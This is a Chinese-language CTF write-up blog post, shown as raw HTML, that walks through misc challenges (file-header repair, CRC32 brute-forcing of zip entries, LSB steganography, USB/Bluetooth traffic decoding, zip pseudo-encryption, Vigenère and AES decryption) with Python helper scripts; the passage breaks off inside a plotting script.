href="#蓝鲨的福利" class="headerlink" title="蓝鲨的福利"></a>蓝鲨的福利</h3><p>  png 文件头</p><p>010 打开添加 89504E47 后保存为 png 文件打开即可</p><p><img src="https://s2.loli.net/2024/03/07/EeqrGJFsjRg8VO1.png" alt=""></p><h3 id="EZcrc"><a href="#EZcrc" class="headerlink" title="EZcrc"></a>EZcrc</h3><p>  crc 爆破</p><p>附件拿到 zip 文件</p><p><img src="https://s2.loli.net/2024/03/07/IOzjEDH9SnRwkgm.png" alt=""></p><p><a href="https://github.com/AabyssZG/CRC32-Tools">https://github.com/AabyssZG/CRC32-Tools</a></p><p>Python xxx.py -3 文件名（zip 放同目录下）</p><p>工具提取下 crc 值</p><p><img src="https://s2.loli.net/2024/03/07/JRi1MmxzXbeIF36.png" alt=""></p><p>排下顺序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取整个文本文件内容</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;C:/Users/Nanian233/Desktop/a.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    content = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取文件名和对应的十六进制数值，放入元组列表</span></span><br><span class="line">data = [(line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].strip(), <span class="built_in">int</span>(line.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].strip(), <span class="number">16</span>)) <span class="keyword">for</span> line <span class="keyword">in</span> content]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按照文件名的数字顺序对元组列表进行排序</span></span><br><span class="line">sorted_data = <span class="built_in">sorted</span>(data, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="number">0</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>].split()[-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出排序后的结果</span></span><br><span class="line"><span class="keyword">for</span> entry <span class="keyword">in</span> sorted_data:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;entry[<span class="number">0</span>]&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(entry[<span class="number">1</span>])&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>改为标准格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_hex</span>(<span class="params">file_content</span>):</span><br><span class="line">    <span class="comment"># 使用正则表达式匹配每一行txt后面的十六进制数据</span></span><br><span class="line">    hex_values = re.findall(<span class="string">r&#x27;\[OK\] \d+\.txt: (0x[0-9a-fA-F]+)&#x27;</span>, file_content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将十六进制数据用逗号隔开，头尾套上方括号</span></span><br><span class="line">    result_str = <span class="string">&#x27;[&#x27;</span> + <span class="string">&#x27;,&#x27;</span>.join(hex_values) + <span class="string">&#x27;]&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result_str</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 用于测试的示例文本，你需要替换成你的实际文本</span></span><br><span class="line">    example_text = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    [OK] 0.txt: 0xd2b184ff</span></span><br><span class="line"><span class="string">    [OK] 1.txt: 0xb462df74</span></span><br><span class="line"><span class="string">    [OK] 2.txt: 0x32973a9e</span></span><br><span class="line"><span class="string">    ... (其他行)</span></span><br><span class="line"><span class="string">    [OK] 217.txt: 0xef809c83</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    result = extract_hex(example_text)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>爆破脚本 <a href="https://blog.csdn.net/mochu7777777/article/details/110206427">blog.csdn.net</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">crc_list = [xxxx]<span class="comment"># 遍历所有可能的3字节数据</span></span><br><span class="line"><span class="keyword">for</span> target_crc <span class="keyword">in</span> crc_list:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">                data = <span class="built_in">bytes</span>([i, j, k])  <span class="comment"># 构造3字节数据</span></span><br><span class="line">                crc = zlib.crc32(data) &amp; <span class="number">0xffffffff</span>  <span class="comment"># 计算CRC32值</span></span><br><span class="line">                <span class="keyword">if</span> crc == target_crc:</span><br><span class="line">                    data=data.decode()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Found matching data: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished searching.&quot;</span>)</span><br></pre></td></tr></table></figure><p>手工分离一下</p><p><img src="https://s2.loli.net/2024/03/07/HX1TDyon5POFaSz.png" alt=""></p><p>字母表：<a href="https://www.xuezimu.com.cn/info/26zimu.php">https://www.xuezimu.com.cn/info/26zimu.php</a></p><p>对照翻译后得到</p><p>U1ZORFZFWjdNV1EzTnpjMVpXUXRZV1JoTUMwMFl6WTNMV0l4T0RVdE1HSXpZelF4WXpsa05tUXlmUT09</p><p>两段 base64 解密得到 flag</p><p><img src="https://s2.loli.net/2024/03/07/udqzED98Y6HIc5M.png" alt=""></p><h3 id="镜流"><a href="#镜流" class="headerlink" title="镜流"></a>镜流</h3><p>密码爆破，像素提取，lsb 隐写</p><p>bandizip 爆破压缩包密码</p><p><img src="https://s2.loli.net/2024/03/07/2dpqIn6SuFLNX3c.png" alt=""></p><p>查看 hint：</p><p><img src="https://s2.loli.net/2024/03/07/UkGpOyEJAWXiuj7.png" alt=""></p><p>想起了 GDOUCTF2023 的题目了</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/130188571">2023 广东海洋大学 GDOUCTF Writeup By AheadSec_末 初的博客-CSDN 博客</a></p><p><img src="https://s2.loli.net/2024/03/07/Fm3xKoygJGcWI1d.png" alt=""></p><p>借用师傅的脚本，改 12 为 10 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;arcaea.png&#x27;</span>)</span><br><span class="line">w = img.width</span><br><span class="line">h = img.height</span><br><span class="line">img_obj = Image.new(<span class="string">&quot;RGB&quot;</span>,(w//<span class="number">10</span>,h//<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w//<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h//<span class="number">10</span>):</span><br><span class="line">        (r,g,b)=img.getpixel((x*<span class="number">10</span>,y*<span class="number">10</span>))</span><br><span class="line">        img_obj.putpixel((x,y),(r,g,b))</span><br><span class="line"></span><br><span class="line">img_obj.save(<span class="string">&#x27;ok.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>提取出一个新的 png 图片</p><p><img src="https://s2.loli.net/2024/03/07/IN69fFuCcXEjosS.png" alt=""></p><p>zsteg 查看发现还藏了一张图在 lsb 最低位处</p><p><img src="https://s2.loli.net/2024/03/07/iGf5aH9V2mzQORL.png" alt=""></p><p>zsteg -e b1,rgb,lsb,xy ok.png -&gt; out.png 提取出来得到 flag</p><p><img src="https://s2.loli.net/2024/03/07/QZ4foU9IYH2aeOT.png" alt=""></p><h3 id="ezUSB"><a href="#ezUSB" class="headerlink" title="ezUSB"></a>ezUSB</h3><p>蓝牙流量，usb 流量</p><p>wireshark 分析流量特征，发现有蓝牙和 usb 流量</p><p><img src="https://s2.loli.net/2024/03/07/DIXe8Ocdvgu3bN9.png" alt=""></p><p>tshark- T json -r 题目.pcapng &gt;output.json</p><p>提取数据以 json 格式</p><p>usb 流量：</p><p>strings output.json | grep “usbhid.data”&gt;1.txt（提取 usb 流量）</p><p><img src="https://s2.loli.net/2024/03/07/VTtxzoeFgSOLAsv.png" alt=""></p><p>去掉字段名和开头的 01 字节，并取随后的 8byte 保存</p><p><img src="https://s2.loli.net/2024/03/07/O2REk5GUf9oLSsj.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;-&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;=&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;[&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;]&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;,&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;.&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;/&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;A&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;B&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;C&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;D&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;E&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;F&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;G&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;H&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;I&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;J&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;K&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;L&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;M&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;N&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;O&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;P&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;Q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;R&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;S&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;T&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;U&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;V&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;W&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;X&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;Y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;Z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;!&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;@&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;#&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;$&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;%&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;^&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;*&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;(&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;)&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="string">&quot;2d&quot;</span>:<span class="string">&quot;_&quot;</span>,<span class="string">&quot;2e&quot;</span>:<span class="string">&quot;+&quot;</span>,<span class="string">&quot;2f&quot;</span>:<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;30&quot;</span>:<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;31&quot;</span>:<span class="string">&quot;|&quot;</span>,<span class="string">&quot;32&quot;</span>:<span class="string">&quot;&lt;NON&gt;&quot;</span>,<span class="string">&quot;33&quot;</span>:<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;34&quot;</span>:<span class="string">&quot;:&quot;</span>,<span class="string">&quot;35&quot;</span>:<span class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,<span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,<span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;change.txt&#x27;</span>)<span class="comment">#数据文件路径</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br></pre></td></tr></table></figure><p>得到后半段 flag</p><p><img src="https://s2.loli.net/2024/03/07/FnhbC6zQW3XmqLO.png" alt=""></p><p>收集删除的字符可以发现 key：<strong>soezusb</strong></p><p>蓝牙流量：</p><p>strings output.json | grep “btatt.value”&gt;2.txt</p><p>修改下格式后保存，依旧使用上面的脚本</p><p><img src="https://s2.loli.net/2024/03/07/JRcHdn8b4WLGTrA.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/Kdmh32T5olVs4Gz.png" alt=""></p><p>先进行 flag 连接：</p><p><strong>AGGSZ{Kp_wn_YRV_SOV_JMFYFFJS!!!}</strong><br><strong>key：soezusb</strong></p><p>维吉尼亚密码</p><p><img src="https://s2.loli.net/2024/03/07/f2xZnT79cqBKV34.png" alt=""></p><p><strong>ISCTF{So_ez_USB_AND_VIGENERE!!!}</strong></p><h3 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a>小蓝鲨的秘密</h3><p>伪加密，宽高隐写，aes 加密</p><p>伪加密</p><p>改两个 00 即可</p><p><img src="https://s2.loli.net/2024/03/07/6esNTR9fXqFUOMZ.png" alt=""></p><p><img src="https://s2.loli.net/2024/03/07/3FaufvHqpodQ2TE.png" alt=""></p><p>png 图片拉下宽高</p><p><img src="https://s2.loli.net/2024/03/07/sCSZJnzBOiIgemK.png" alt=""></p><p>得到 key:15CTF2023</p><p><img src="https://s2.loli.net/2024/03/07/F9uZg51HYUlPq2B.png" alt=""></p><p>解密 AES 即可</p><p><a href="https://www.sojson.com/encrypt_aes.html">在线 AES 加密 | AES 解密 - 在线工具</a></p><p><img src="https://s2.loli.net/2024/03/07/5IkxUAoECpFad1H.png" alt=""></p><h3 id="Ez-misc"><a href="#Ez-misc" class="headerlink" title="Ez_misc"></a>Ez_misc</h3><p>  ppt 隐写，jpg 文件头</p><p>拿到附件</p><p><img src="https://s2.loli.net/2024/03/07/iyFN4JZH5pusWh7.png" alt=""></p><p>ppt 最后一张图备注处拿到密码：M13c_!ps2s23</p><p><img src="https://s2.loli.net/2024/03/07/U5b1OBx9clQARtF.png" alt=""></p><p>解压 flag.zip 后发现 jpg 文件打不开</p><p><img src="https://s2.loli.net/2024/03/07/5lzPGWVqtoricYw.png" alt=""></p><p>010 打开后发现文件头缺失，补充即可</p><p><img src="https://s2.loli.net/2024/03/07/bGyqtM8rOmXUWhQ.png" alt=""></p><p>打开得到二维码，扫码得到 flag</p><p><img src="https://s2.loli.net/2024/03/07/VGQmbn8Bsj6u3Kg.png" alt=""></p><h3 id="spalshes"><a href="#spalshes" class="headerlink" title="spalshes"></a>spalshes</h3><p>散点图</p><p>预期解：</p><p><img src="https://s2.loli.net/2024/03/07/u2wZ9zPcVaiKrCg.png" alt=""></p><p>解密文本拿到点坐标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt </span><br><span class="line"><span class="comment"># 提供的数据 